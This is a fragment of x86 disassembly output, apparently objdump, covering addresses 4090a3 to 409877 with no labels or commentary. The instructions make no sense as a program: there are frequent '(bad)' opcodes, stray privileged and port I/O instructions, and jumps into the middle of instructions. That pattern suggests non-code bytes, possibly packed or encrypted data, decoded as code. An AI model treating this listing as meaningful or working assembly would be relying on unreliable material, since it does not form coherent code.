  4090a3:	cld    
  4090a4:	ss sub bl,ah
  4090a7:	push   0x54
  4090a9:	or     ah,ch
  4090ab:	out    dx,eax
  4090ac:	out    dx,al
  4090ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090ae:	cmp    esp,eax
  4090b0:	das    
  4090b1:	repz cli 
  4090b3:	xor    DWORD PTR [edx],esi
  4090b5:	dec    edi
  4090b6:	mov    ebp,ds
  4090b8:	push   edi
  4090b9:	mov    ebp,0xccece157
  4090be:	outs   dx,DWORD PTR ds:[esi]
  4090bf:	jnp    0x40907f
  4090c1:	inc    esi
  4090c2:	rcr    BYTE PTR [ecx],1
  4090c4:	add    eax,0x7f4c45f0
  4090c9:	pop    ebx
  4090ca:	sbb    DWORD PTR gs:[ebp-0xd],ebx
  4090ce:	jge    0x4090ef
  4090d0:	pop    ebp
  4090d1:	rcr    DWORD PTR [ebx-0x7116250],cl
  4090d7:	aad    0x33
  4090d9:	cmp    BYTE PTR [eax+0x173b90ad],dl
  4090df:	lods   eax,DWORD PTR ds:[esi]
  4090e0:	bound  ecx,QWORD PTR [edx]
  4090e2:	mov    esp,0x16df95a4
  4090e7:	les    ecx,FWORD PTR [ecx+edx*1-0x652878ef]
  4090ee:	pop    esi
  4090ef:	iret   
  4090f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090f2:	mov    WORD PTR [ebp-0x110f22ef],?
  4090f8:	std    
  4090f9:	fistp  WORD PTR [eax]
  4090fb:	xor    al,0xe
  4090fd:	je     0x409126
  4090ff:	mov    ds:0x85a8faf0,eax
  409104:	pushf  
  409105:	mov    eax,0xb6f24dee
  40910a:	call   0x41b6:0xa9ef59e8
  409111:	ret    0x66e4
  409114:	pop    ebp
  409115:	sub    DWORD PTR [esi+0x5],0xca3522d7
  40911c:	xchg   esp,eax
  40911d:	(bad)  
  40911e:	js     0x40913d
  409120:	dec    edi
  409121:	mov    BYTE PTR [ecx],bh
  409123:	ins    BYTE PTR es:[edi],dx
  409124:	jnp    0x409126
  409126:	xchg   esp,eax
  409127:	mov    eax,0x54188620
  40912c:	sub    BYTE PTR [esi-0x57b495e0],0xe8
  409133:	pop    ebp
  409134:	addr16 pop ecx
  409136:	dec    edx
  409137:	mov    es,WORD PTR gs:[edx]
  40913a:	jge    0x409138
  40913c:	aaa    
  40913d:	test   al,0x9e
  40913f:	add    BYTE PTR [ebp-0xf6dffa3],bl
  409145:	dec    esi
  409146:	data16 adc BYTE PTR [eax],bh
  409149:	jle    0x409131
  40914b:	loop   0x409110
  40914d:	test   eax,0x1f869a6c
  409152:	sub    DWORD PTR [ecx],0x2c667093
  409158:	mov    ecx,0xdd386348
  40915d:	ret    0xc4ee
  409160:	cmc    
  409161:	mov    esp,0xea4658f1
  409166:	scas   eax,DWORD PTR es:[edi]
  409167:	pop    ss
  409168:	stos   DWORD PTR es:[edi],eax
  409169:	push   ebx
  40916a:	dec    BYTE PTR [edx]
  40916c:	mov    bh,0xa8
  40916e:	scas   al,BYTE PTR es:[edi]
  40916f:	jae    0x409148
  409171:	fidiv  DWORD PTR [ebp-0x35]
  409174:	inc    ecx
  409175:	imul   edi,DWORD PTR [ecx+edx*2-0x13330ad2],0xffffff81
  40917d:	lock dec edi
  40917f:	icebp  
  409180:	mov    edi,0x648400af
  409185:	push   0x4b0433de
  40918a:	mov    bh,0x24
  40918c:	lds    esi,FWORD PTR [esi-0xa]
  40918f:	dec    esp
  409190:	dec    ecx
  409191:	xchg   bl,bl
  409193:	(bad)  
  409195:	(bad)  
  409196:	cmp    eax,0x56f84e32
  40919b:	jecxz  0x4091d2
  40919d:	jl     0x409151
  40919f:	push   ebx
  4091a0:	jmp    0xb800428e
  4091a5:	add    BYTE PTR [ecx],0x58
  4091a8:	out    0x1b,eax
  4091aa:	shl    BYTE PTR [edx+edx*8-0x78],1
  4091ae:	out    dx,al
  4091af:	leave  
  4091b0:	adc    BYTE PTR [esi+eiz*8+0x7e],cl
  4091b4:	std    
  4091b5:	cmp    eax,eax
  4091b7:	daa    
  4091b8:	pop    ecx
  4091b9:	(bad)  
  4091bb:	fld    TBYTE PTR [ebp-0x6c16c069]
  4091c1:	cs dec ecx
  4091c3:	xchg   esp,eax
  4091c4:	xor    al,0x13
  4091c6:	jp     0x409215
  4091c8:	cwde   
  4091c9:	pop    eax
  4091ca:	cmp    eax,0xf455786
  4091cf:	fld    QWORD PTR [edi-0x12d09453]
  4091d5:	sub    al,0x69
  4091d7:	jnp    0x40918b
  4091d9:	outs   dx,DWORD PTR ds:[esi]
  4091da:	ins    BYTE PTR es:[edi],dx
  4091db:	(bad)  
  4091dd:	in     al,0xcc
  4091df:	and    cl,ch
  4091e1:	sub    edi,eax
  4091e3:	xor    BYTE PTR [ebx+0x7dbd8731],ah
  4091e9:	arpl   WORD PTR [eax-0x49],cx
  4091ec:	and    esi,0xc5c51371
  4091f2:	imul   ecx,DWORD PTR [ebp+0x49361f43],0x64219b3d
  4091fc:	popf   
  4091fd:	mov    esi,0x2dc81ddc
  409202:	mov    edi,0xc70dca34
  409207:	loope  0x409227
  409209:	xchg   esp,eax
  40920a:	(bad)  
  40920b:	cmp    edx,DWORD PTR [edx-0x5690812b]
  409211:	in     eax,0xd0
  409213:	cmp    DWORD PTR [ebp-0x6d],esi
  409216:	sub    cl,BYTE PTR [ecx+0x0]
  409219:	cmp    edx,DWORD PTR [edi+0x76143595]
  40921f:	mov    edi,0x22bdecac
  409224:	shr    ebx,0xbb
  409227:	sbb    DWORD PTR [esi+0x61746338],edi
  40922d:	mov    al,0x67
  40922f:	retf   0x6392
  409232:	jecxz  0x4092b0
  409234:	push   eax
  409235:	mov    bh,cl
  409237:	xchg   ebp,eax
  409238:	pop    ecx
  409239:	mov    bl,bh
  40923b:	outs   dx,BYTE PTR ds:[esi]
  40923c:	mov    BYTE PTR [eax],0x1b
  40923f:	leave  
  409240:	lds    eax,FWORD PTR [ebp*2+0x35562bcc]
  409247:	or     eax,0x7ab69c89
  40924c:	scas   al,BYTE PTR es:[edi]
  40924d:	add    al,0x4f
  40924f:	ror    BYTE PTR [edi+0x15],0x59
  409253:	scas   eax,DWORD PTR es:[edi]
  409254:	xor    esi,DWORD PTR [eax+0x53]
  409257:	stos   DWORD PTR es:[edi],eax
  409258:	adc    eax,0x525ca617
  40925d:	fcomip st,st(2)
  40925f:	xchg   esi,eax
  409260:	lock jmp 0x40922d
  409263:	lea    esp,[eax+0x4c]
  409266:	sub    BYTE PTR [ebx],0x10
  409269:	mov    edx,0xc1a40eb7
  40926e:	and    al,0x81
  409270:	rol    DWORD PTR [ecx+ecx*8],0x2c
  409274:	pusha  
  409275:	aaa    
  409276:	add    esi,0xc4d0d03c
  40927c:	and    BYTE PTR ds:[esi],dh
  40927f:	inc    esp
  409280:	mov    edx,0x7d91581e
  409285:	lea    esp,[ecx]
  409287:	icebp  
  409288:	adc    BYTE PTR [edx],bh
  40928a:	push   ss
  40928b:	mov    cl,0x34
  40928d:	test   esp,edi
  40928f:	lds    edi,FWORD PTR [eax-0x5ddf019c]
  409295:	inc    ecx
  409296:	pop    eax
  409297:	push   edx
  409298:	mov    bh,0x34
  40929a:	mov    eax,0x780fda3
  40929f:	xor    eax,DWORD PTR [ebx]
  4092a1:	sbb    edx,DWORD PTR [ebp-0x43]
  4092a4:	xchg   DWORD PTR [eax],eax
  4092a6:	cdq    
  4092a7:	mov    ah,BYTE PTR [edx-0x8]
  4092aa:	dec    ebp
  4092ab:	pop    esp
  4092ac:	pop    esp
  4092ad:	sub    ecx,edi
  4092af:	push   esi
  4092b0:	dec    edx
  4092b1:	mov    ebx,0x990f8fd2
  4092b6:	jnp    0x409297
  4092b8:	jbe    0x4092d9
  4092ba:	push   ss
  4092bb:	out    dx,eax
  4092bc:	scas   eax,DWORD PTR es:[edi]
  4092bd:	bound  esp,QWORD PTR [esi+ebx*2-0x61]
  4092c1:	xchg   esp,eax
  4092c2:	not    dl
  4092c4:	leave  
  4092c5:	(bad)  
  4092c6:	inc    esp
  4092c7:	xor    eax,0x267cbda5
  4092cc:	push   ebp
  4092cd:	sti    
  4092ce:	stos   DWORD PTR es:[edi],eax
  4092cf:	mov    al,0xc
  4092d1:	mov    al,ds:0x2bee5198
  4092d6:	and    BYTE PTR ds:0x61760902,bh
  4092dc:	retf   
  4092dd:	ja     0x4092f6
  4092df:	mov    cl,0xc6
  4092e1:	ret    
  4092e2:	sbb    esi,edi
  4092e4:	pop    eax
  4092e5:	jl     0x409274
  4092e7:	imul   edi,edi,0x7
  4092ea:	sahf   
  4092eb:	loope  0x409351
  4092ed:	push   esp
  4092ee:	xor    eax,0xb4b88586
  4092f3:	scas   al,BYTE PTR es:[edi]
  4092f4:	in     al,dx
  4092f5:	push   esp
  4092f6:	cmp    al,cl
  4092f8:	fnstsw WORD PTR [esi+0x1c]
  4092fb:	fucomip st,st(3)
  4092fd:	push   ds
  4092fe:	aaa    
  4092ff:	aas    
  409300:	xchg   edx,eax
  409301:	inc    edi
  409302:	jmp    0xcff9622a
  409307:	clc    
  409308:	or     eax,0x8641c69a
  40930d:	xchg   esi,eax
  40930e:	xchg   esp,eax
  40930f:	mov    edi,0x95672507
  409314:	repz cmp al,0xe0
  409317:	jle    0x409308
  409319:	and    eax,0xc2ce4fe
  40931e:	into   
  40931f:	(bad)  [esi-0x7e7fbebb]
  409325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409326:	mov    dl,0x9a
  409328:	pop    edi
  409329:	mov    ds:0x66fb583c,al
  40932e:	not    DWORD PTR [edx]
  409330:	(bad)  
  409331:	cmp    esp,DWORD PTR [edx+esi*1+0x58]
  409335:	and    DWORD PTR [ecx+0x7636447b],esp
  40933b:	hlt    
  40933c:	outs   dx,BYTE PTR ds:[esi]
  40933d:	rol    BYTE PTR [edx],0xa9
  409340:	add    cl,BYTE PTR [esi+0x5f0c13d0]
  409346:	or     ah,BYTE PTR [esp+esi*2-0xb7a859b]
  40934d:	jg     0x40933b
  40934f:	dec    ebp
  409350:	das    
  409351:	rcr    cl,cl
  409353:	ud0    eax,DWORD PTR [esp+ebp*8+0x6]
  409358:	adc    eax,0xf4851242
  40935d:	mov    cl,0x10
  40935f:	test   al,0x8d
  409361:	(bad)  
  409362:	and    al,BYTE PTR ds:0x8e63711a
  409368:	add    ch,BYTE PTR [ebp+0x7]
  40936b:	sub    DWORD PTR ds:0x95bbcd46,esp
  409371:	mov    al,0x2a
  409373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409374:	fcmovu st,st(1)
  409376:	adc    BYTE PTR [ebp-0x35],al
  409379:	add    bl,ah
  40937b:	iret   
  40937c:	jb     0x4093e2
  40937e:	mov    edx,0x1f2577e3
  409383:	push   ecx
  409384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409385:	mov    al,ds:0xef63a4da
  40938a:	jne    0x4093e6
  40938c:	mov    esp,0x8e387d32
  409391:	call   0x7763:0xf9fe0b5d
  409398:	push   esi
  409399:	out    dx,eax
  40939a:	lahf   
  40939b:	fisttp QWORD PTR [ebp-0x72]
  40939e:	xchg   ecx,eax
  40939f:	xor    al,0xf8
  4093a1:	ds dec esp
  4093a3:	cmp    bh,BYTE PTR [esi-0x16]
  4093a6:	pop    ebx
  4093a7:	outs   dx,BYTE PTR ds:[esi]
  4093a8:	pop    esp
  4093a9:	jnp    0x409427
  4093ab:	xor    esp,DWORD PTR [ebp-0x5cbd27d0]
  4093b1:	dec    ebx
  4093b2:	icebp  
  4093b3:	inc    ebx
  4093b4:	inc    esi
  4093b5:	push   ss
  4093b6:	jmp    0xc3c5:0xa2b73d08
  4093bd:	rcr    DWORD PTR [esi],1
  4093bf:	(bad)
  4093c2:	lods   al,BYTE PTR ds:[esi]
  4093c3:	jmp    0x4093ea
  4093c5:	js     0x409429
  4093c7:	sub    DWORD PTR [edi],edi
  4093c9:	or     eax,0xafa00c7c
  4093ce:	jbe    0x40942d
  4093d0:	iret   
  4093d1:	ds cld 
  4093d3:	jbe    0x40942b
  4093d5:	test   dl,0x94
  4093d8:	arpl   dx,ax
  4093da:	rcl    ah,cl
  4093dc:	xchg   BYTE PTR [edx],cl
  4093de:	loopne 0x4093ff
  4093e0:	je     0x4093bf
  4093e2:	adc    ah,BYTE PTR [esi]
  4093e4:	cmp    eax,0x105eb9ec
  4093e9:	fidivr WORD PTR [edi+0x7387c008]
  4093ef:	pop    eax
  4093f0:	aaa    
  4093f1:	sti    
  4093f2:	inc    edx
  4093f3:	or     ebp,DWORD PTR [edx]
  4093f5:	mul    BYTE PTR [esi]
  4093f7:	mov    bl,0x4b
  4093f9:	(bad)  
  4093fa:	fisttp DWORD PTR [ebp+0x60]
  4093fd:	scas   al,BYTE PTR es:[edi]
  4093fe:	dec    ecx
  4093ff:	pop    esp
  409400:	fsubr  QWORD PTR [ecx+0xd2ad584]
  409406:	out    dx,al
  409407:	loopne 0x4093c7
  409409:	into   
  40940a:	cmp    ch,ah
  40940c:	out    0x5,eax
  40940e:	cmp    bh,BYTE PTR [eax+0x7d]
  409411:	test   eax,edi
  409413:	or     cl,BYTE PTR [ebx-0x5e0a012]
  409419:	mov    eax,0xbb114cc7
  40941e:	add    BYTE PTR [edi-0x68],dl
  409421:	not    DWORD PTR [ebx+0x62b3a26d]
  409427:	ret    
  409428:	xor    al,0x48
  40942a:	mov    eax,0x227505e9
  40942f:	or     DWORD PTR ss:[esi+0x2fe5c204],0x4094c019
  40943a:	and    al,0x1b
  40943c:	sub    DWORD PTR [edx],esi
  40943e:	nop
  40943f:	out    dx,al
  409440:	inc    ecx
  409441:	outs   dx,BYTE PTR ds:[esi]
  409442:	fs push 0x50
  409445:	(bad)  
  409446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409447:	bnd jo 0x40945f
  40944a:	inc    esp
  40944b:	jmp    0xfdbab4b7
  409450:	leave  
  409451:	fbstp  TBYTE PTR [edx+0x428714a2]
  409457:	mov    eax,ds:0xd38fbbfe
  40945c:	pop    ss
  40945d:	xchg   ecx,eax
  40945e:	mov    bl,0x20
  409460:	iret   
  409461:	repnz sti 
  409463:	test   eax,0xdb07fb4c
  409468:	inc    ebp
  409469:	dec    ebp
  40946a:	in     al,0x2d
  40946c:	mov    bh,0xd3
  40946e:	mov    ebp,DWORD PTR [edi+0x339cef1b]
  409474:	xor    eax,0xef903b61
  409479:	push   0xffffffda
  40947b:	jbe    0x40947c
  40947d:	vpor   xmm6,xmm6,XMMWORD PTR [eax+ebp*2-0x266eded9]
  409486:	sar    BYTE PTR [ebp+0x11619830],cl
  40948c:	push   DWORD PTR [ebx+0x0]
  40948f:	pop    ss
  409490:	fimul  DWORD PTR [edi]
  409492:	pop    es
  409493:	push   esi
  409494:	jmp    0x4094bd
  409496:	mov    DWORD PTR [eax+0x59],ecx
  409499:	ret    
  40949a:	and    BYTE PTR [edx-0x7f],0xd5
  40949e:	mov    WORD PTR [edi-0x2c6dea9],es
  4094a4:	test   DWORD PTR [ebx],eax
  4094a6:	cs cwde 
  4094a8:	xchg   ebx,eax
  4094a9:	jmp    0x7331684a
  4094ae:	xor    eax,0x492f0af
  4094b3:	mov    ds:0xfa196d08,eax
  4094b8:	and    DWORD PTR [ebx-0xf],ebx
  4094bb:	xor    edi,DWORD PTR [ebx]
  4094bd:	jbe    0x40949f
  4094bf:	jo     0x4094d3
  4094c1:	xchg   edx,eax
  4094c2:	out    dx,eax
  4094c3:	inc    edx
  4094c4:	xchg   ebp,eax
  4094c5:	lahf   
  4094c6:	scas   eax,DWORD PTR es:[edi]
  4094c7:	add    DWORD PTR gs:[edx],0xffffffad
  4094cb:	ja     0x409456
  4094cd:	ret    
  4094ce:	ins    BYTE PTR es:[edi],dx
  4094cf:	adc    al,0xe3
  4094d1:	ins    DWORD PTR es:[edi],dx
  4094d2:	cdq    
  4094d3:	imul   ecx,DWORD PTR [ebp+ebx*1-0x66],0xffffffe6
  4094d8:	mov    esp,DWORD PTR [edi]
  4094da:	bound  esi,QWORD PTR [edi-0x29fbffbc]
  4094e0:	or     BYTE PTR [ecx+ebx*2-0x36bdd863],al
  4094e7:	mov    ebp,0xf07befc1
  4094ec:	and    ebp,DWORD PTR [ebx]
  4094ee:	mov    ds:0xff5c3409,al
  4094f3:	mov    cl,0x7e
  4094f5:	add    eax,0xc9e10147
  4094fa:	mov    ds:0x71b43e46,eax
  4094ff:	imul   ebp,DWORD PTR [edi-0x14dec360],0x94cb02d6
  409509:	in     eax,0x47
  40950b:	jmp    0x409533
  40950d:	mov    al,0xa8
  40950f:	and    ah,BYTE PTR [ebx+edx*1-0x4d5ed2b3]
  409516:	(bad)  
  409517:	cli    
  409518:	loopne 0x4094b8
  40951a:	out    dx,al
  40951b:	retf   0xb2d9
  40951e:	xlat   BYTE PTR ds:[ebx]
  40951f:	fsubp  st(1),st
  409521:	xchg   eax,eax
  409523:	das    
  409524:	out    0x16,al
  409526:	loopne 0x4094d8
  409528:	stos   DWORD PTR es:[edi],eax
  409529:	fdivr  DWORD PTR [esi]
  40952b:	and    DWORD PTR [eax],esi
  40952d:	add    eax,0x4f527dc4
  409532:	dec    esp
  409533:	or     ecx,edi
  409535:	pop    esp
  409536:	pop    edx
  409537:	jne    0x40958f
  409539:	lds    eax,FWORD PTR [edi]
  40953b:	mov    ch,0x77
  40953d:	jmp    0x409580
  40953f:	jl     0x4095b0
  409541:	(bad)  [ecx]
  409543:	pop    esp
  409544:	test   al,0xc5
  409546:	jle    0x4094ee
  409548:	xor    cl,BYTE PTR [edx-0xf15335c]
  40954e:	outs   dx,DWORD PTR ds:[esi]
  40954f:	imul   esi,DWORD PTR [edx],0xffffffc4
  409552:	pop    ds
  409553:	stos   DWORD PTR es:[edi],eax
  409554:	mov    bh,0xdf
  409556:	cmp    DWORD PTR ds:0x855f37c6,ecx
  40955c:	pop    eax
  40955d:	jo     0x4095b5
  40955f:	xor    BYTE PTR [edi-0x4f1e86a4],bh
  409565:	add    eax,0x16e84d5a
  40956a:	ds mov dl,0xda
  40956d:	fisttp DWORD PTR [esi-0x6a]
  409570:	stos   BYTE PTR es:[edi],al
  409571:	imul   edx,DWORD PTR [esi+0x39],0x6d474815
  409578:	xor    al,0xee
  40957a:	pop    di
  40957c:	and    al,0xfd
  40957e:	inc    ebx
  40957f:	test   bl,ah
  409581:	adc    DWORD PTR [ecx],0xfffffffd
  409584:	xor    ebx,edi
  409586:	lock mov db6,esp
  40958a:	mov    ebx,0xdfc6bc90
  40958f:	mov    edx,0x43b7e3f
  409594:	mov    edx,0x655d8cf1
  409599:	or     esi,eax
  40959b:	mov    ds:0x3a987ef5,eax
  4095a0:	in     al,0xc7
  4095a2:	sbb    al,0x32
  4095a4:	fdivr  QWORD PTR [eax]
  4095a6:	fwait
  4095a7:	cdq    
  4095a8:	js     0x4095a0
  4095aa:	sbb    cl,ch
  4095ac:	outs   dx,BYTE PTR ds:[esi]
  4095ad:	mov    edi,0x4960200a
  4095b2:	bound  ebp,QWORD PTR [ebp+0x23]
  4095b5:	or     dh,BYTE PTR [ecx]
  4095b7:	sub    ecx,esp
  4095b9:	add    eax,0x2b5e9b08
  4095be:	jmp    0x4095a4
  4095c0:	dec    ebx
  4095c1:	das    
  4095c2:	mov    edx,0x6a216947
  4095c7:	enter  0x5366,0x87
  4095cb:	pop    eax
  4095cc:	push   0xffffff9d
  4095ce:	fmul   QWORD PTR [edi+esi*2+0x30]
  4095d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095d3:	pop    edi
  4095d4:	jg     0x409645
  4095d6:	inc    edx
  4095d7:	(bad)  
  4095d8:	cdq    
  4095d9:	cdq    
  4095da:	push   0xb8ab1c64
  4095df:	fdivr  QWORD PTR [ebx]
  4095e1:	inc    edi
  4095e2:	mov    cl,0xe5
  4095e4:	outs   dx,BYTE PTR ds:[esi]
  4095e5:	aad    0xb9
  4095e7:	movsx  esi,BYTE PTR [ebx-0x54b2e41]
  4095ee:	aaa    
  4095ef:	daa    
  4095f0:	mov    ah,0xa5
  4095f2:	(bad)  
  4095f3:	(bad)  
  4095f4:	ss mov ebx,?
  4095f7:	mov    ecx,0xa6c47a01
  4095fc:	xlat   BYTE PTR ds:[ebx]
  4095fd:	popa   
  4095fe:	fimul  WORD PTR [ebx-0x6e]
  409601:	jno    0x4095c4
  409603:	mov    bh,0x9
  409605:	or     al,0x2d
  409607:	sbb    al,0x6
  409609:	and    eax,0x1ef62a33
  40960e:	jb     0x4095fe
  409610:	out    0xb7,al
  409612:	in     eax,0x89
  409614:	ret    0xc27f
  409617:	xchg   BYTE PTR [esi+0x57],dh
  40961a:	(bad)  
  40961b:	in     eax,dx
  40961c:	sbb    BYTE PTR [esi+0x6f],0x74
  409620:	push   esi
  409621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409622:	sub    ax,0x513b
  409626:	call   0x887:0x12f8cf7b
  40962d:	mov    esp,0xa72c74b4
  409632:	verw   WORD PTR [edx-0x45]
  409636:	mov    esp,0x8da6076f
  40963b:	mov    eax,ds:0x5cc8ac32
  409640:	jbe    0x409628
  409642:	mov    BYTE PTR [esi+0x7c],dh
  409645:	stc    
  409646:	stc    
  409647:	dec    eax
  409648:	lods   eax,DWORD PTR ds:[esi]
  409649:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40964b:	fldenv [eax-0xa]
  40964e:	inc    eax
  40964f:	add    ebp,DWORD PTR [eax]
  409651:	popa   
  409652:	mov    edi,0x88a7818c
  409657:	and    DWORD PTR [ebx-0x36],ebp
  40965a:	push   ecx
  40965c:	mov    ch,0xb0
  40965e:	or     al,0x24
  409660:	and    al,0xb0
  409662:	mov    al,BYTE PTR [ebp+edx*2-0x7db457eb]
  409669:	sbb    al,0xc6
  40966b:	push   ecx
  40966c:	sub    eax,0xa76c99f7
  409671:	push   ecx
  409672:	(bad)  [ecx]
  409674:	dec    ecx
  409675:	aam    0x13
  409677:	(bad)  
  409679:	cli    
  40967a:	sbb    dh,cl
  40967c:	mov    eax,0xecaf65dd
  409681:	or     BYTE PTR [ebx+ecx*4+0xaf51ce2],bl
  409688:	out    0xe4,eax
  40968a:	dec    ebp
  40968b:	int3   
  40968c:	mov    eax,0x2b795556
  409691:	int3   
  409692:	rcr    edx,cl
  409694:	xchg   ecx,eax
  409695:	xor    ebx,DWORD PTR [ebp+0x7]
  409698:	push   cs
  409699:	sub    eax,0x8bedf01
  40969e:	ins    DWORD PTR es:[edi],dx
  40969f:	mov    dh,0x15
  4096a1:	mov    BYTE PTR [ecx-0xb48e99a],cl
  4096a7:	jge    0x4096fd
  4096a9:	test   BYTE PTR [esi+0x57],bh
  4096ac:	adc    dl,bl
  4096ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096af:	adc    eax,0x9263e501
  4096b4:	in     eax,dx
  4096b5:	mov    dh,0x60
  4096b7:	jb     0x409731
  4096b9:	imul   ecx
  4096bb:	or     eax,0x15378e7e
  4096c0:	pop    eax
  4096c1:	cmp    eax,0xd7b691d8
  4096c6:	add    bl,al
  4096c8:	lock sbb bl,BYTE PTR [eax-0x5]
  4096cc:	bound  eax,QWORD PTR [ecx+ecx*4-0x279e41aa]
  4096d3:	xor    al,0x6b
  4096d5:	adc    esp,DWORD PTR [edx-0x59]
  4096d8:	addr16 aaa 
  4096da:	inc    edi
  4096db:	stc    
  4096dc:	push   ecx
  4096dd:	clc    
  4096de:	sti    
  4096df:	jp     0x4096c4
  4096e1:	fst    st(7)
  4096e3:	or     esp,DWORD PTR [ebp-0x147936a7]
  4096e9:	push   ebx
  4096ea:	jl     0x4096fa
  4096ec:	call   0x9be682c6
  4096f1:	sbb    ebp,DWORD PTR [edi]
  4096f3:	and    esp,DWORD PTR [esi-0x75]
  4096f6:	js     0x4096e5
  4096f8:	and    DWORD PTR [esi+0x62509ad5],eax
  4096fe:	fwait
  4096ff:	jb     0x4096d3
  409701:	dec    DWORD PTR [edi+0x4f]
  409704:	out    dx,al
  409705:	add    eax,0x4498dcec
  40970a:	(bad)  
  40970b:	jo     0x40975d
  40970d:	jmp    0x4096da
  40970f:	xor    BYTE PTR [edx+0x28c9dc72],ah
  409715:	pop    esi
  409716:	fwait
  409717:	loope  0x4096c8
  409719:	pop    eax
  40971a:	xchg   ebp,eax
  40971b:	sti    
  40971c:	jne    0x4096ec
  40971e:	push   cs
  40971f:	stos   DWORD PTR es:[edi],eax
  409720:	sbb    eax,0xec10d290
  409725:	dec    ebx
  409726:	jno    0x409795
  409728:	lahf   
  409729:	data16 and al,0x51
  40972c:	ret    
  40972d:	pop    eax
  40972e:	jo     0x4097af
  409730:	aaa    
  409731:	fwait
  409732:	out    0x5f,eax
  409734:	inc    ebx
  409735:	push   edx
  409736:	mov    ds:0x65b59a28,ax
  40973c:	inc    esi
  40973d:	xor    DWORD PTR [eax-0x1a],0xfffffff4
  409741:	test   ecx,esp
  409743:	push   ebx
  409744:	call   0x3d79:0xab9e7630
  40974b:	sbb    dh,BYTE PTR [esi-0x28]
  40974e:	cdq    
  40974f:	mov    eax,0xfd1a6ba6
  409754:	jo     0x4096f7
  409756:	mov    al,ds:0x364ac16e
  40975b:	xchg   ecx,eax
  40975c:	neg    DWORD PTR [edx]
  40975e:	pop    edi
  40975f:	jnp    0x409738
  409761:	add    ebx,DWORD PTR [ebp+0x3d]
  409764:	add    al,0x5d
  409766:	fmul   DWORD PTR [ebp+0x12]
  409769:	cmp    eax,0x286e2509
  40976e:	das    
  40976f:	dec    esp
  409770:	or     eax,0x9ebf11e8
  409775:	adc    ch,BYTE PTR [edi+0x73dd7f05]
  40977b:	inc    ecx
  40977c:	(bad)  
  40977d:	mov    ?,WORD PTR [ebp-0x66ae255]
  409783:	out    0x2b,al
  409785:	out    dx,eax
  409786:	mov    ebp,0x25a08a81
  40978b:	mov    dh,0x6a
  40978d:	shl    BYTE PTR [ecx*8+0x21a255da],1
  409794:	xor    BYTE PTR [edi],al
  409796:	test   al,0x99
  409798:	es hlt 
  40979a:	jne    0x409739
  40979c:	pop    ds
  40979d:	adc    edi,DWORD PTR [ecx+0x358092]
  4097a3:	pop    es
  4097a4:	mov    ebp,DWORD PTR [edx]
  4097a6:	gs inc edx
  4097a8:	sbb    BYTE PTR ds:0x92da48c3,dl
  4097ae:	inc    esp
  4097af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097b0:	cmp    edx,DWORD PTR [ebp+0x1c]
  4097b3:	aaa    
  4097b4:	cmp    dl,cl
  4097b6:	push   esi
  4097b7:	mov    al,0xfc
  4097b9:	inc    ecx
  4097ba:	xchg   BYTE PTR [ecx],bl
  4097bc:	imul   edi,DWORD PTR [edx],0x28
  4097bf:	movsx  esi,dx
  4097c2:	adc    ah,dl
  4097c4:	inc    esp
  4097c5:	lods   al,BYTE PTR ds:[esi]
  4097c6:	out    dx,al
  4097c7:	push   edx
  4097c8:	in     al,0x0
  4097ca:	mov    bl,cl
  4097cc:	dec    edi
  4097cd:	sbb    BYTE PTR [edx-0x46],ch
  4097d0:	inc    ebp
  4097d1:	ins    BYTE PTR es:[edi],dx
  4097d2:	jge    0x409770
  4097d4:	ret    
  4097d5:	add    DWORD PTR [esi],edi
  4097d7:	xor    bh,ah
  4097d9:	enter  0xe6a0,0xe5
  4097dd:	cwde   
  4097de:	and    eax,edi
  4097e0:	mov    WORD PTR [ecx+0x7c],?
  4097e3:	out    0x2f,al
  4097e5:	pop    ss
  4097e6:	sub    al,0xe9
  4097e8:	sub    esp,esp
  4097ea:	mov    bl,cl
  4097ec:	push   ds
  4097ed:	ja     0x409780
  4097ef:	aaa    
  4097f0:	mov    cl,0xa7
  4097f2:	or     BYTE PTR [edx+0x4b],0xe3
  4097f6:	loopne 0x409803
  4097f8:	icebp  
  4097f9:	and    eax,0x5da6c
  4097fe:	and    ebp,ebp
  409800:	dec    edx
  409801:	not    DWORD PTR [ecx+0x6e]
  409804:	mov    dh,0xd3
  409806:	inc    esi
  409807:	cmp    ebp,ebx
  409809:	aad    0xa5
  40980b:	int3   
  40980c:	xchg   ah,ch
  40980e:	pop    esi
  409810:	rcr    BYTE PTR [ebx],1
  409812:	pop    esp
  409813:	xor    eax,DWORD PTR [ebx+0x5a]
  409816:	pop    esp
  409817:	jl     0x4097a3
  409819:	jle    0x40988c
  40981b:	loop   0x409897
  40981d:	jg     0x4097eb
  40981f:	sbb    al,0x58
  409821:	les    edi,FWORD PTR [ebx+0x0]
  409824:	adc    bl,ah
  409826:	mov    ds:0xee5823ed,al
  40982b:	push   ecx
  40982c:	xchg   ebx,eax
  40982d:	cs pop edx
  40982f:	test   DWORD PTR [ebp+0x1207908],ecx
  409835:	addr16 pop eax
  409837:	inc    ebp
  409838:	dec    ecx
  409839:	sti    
  40983a:	pop    eax
  40983b:	pop    ebx
  40983c:	aas    
  40983d:	data16 xor al,0x8
  409840:	mov    BYTE PTR [esi-0x56],ah
  409843:	and    BYTE PTR [edx-0x4f81d225],dh
  409849:	ja     0x4097d7
  40984b:	aaa    
  40984c:	fisub  WORD PTR [edx-0x60]
  40984f:	fmul   QWORD PTR [ebp+edx*8-0x2e2ff7d4]
  409856:	fisub  DWORD PTR [eax+0x1f91aee2]
  40985c:	add    DWORD PTR [ebp+0x45],0x9ade917b
  409863:	leave  
  409864:	inc    ebp
  409865:	and    eax,eax
  409867:	sub    eax,0xe7d4f8c5
  40986c:	bound  edi,QWORD PTR [edi]
  40986e:	inc    esp
  40986f:	in     al,0x8
  409871:	inc    esi
  409872:	jmp    0x36d8dc89
  409877:	outs   dx,BYTE PTR ds:[esi]
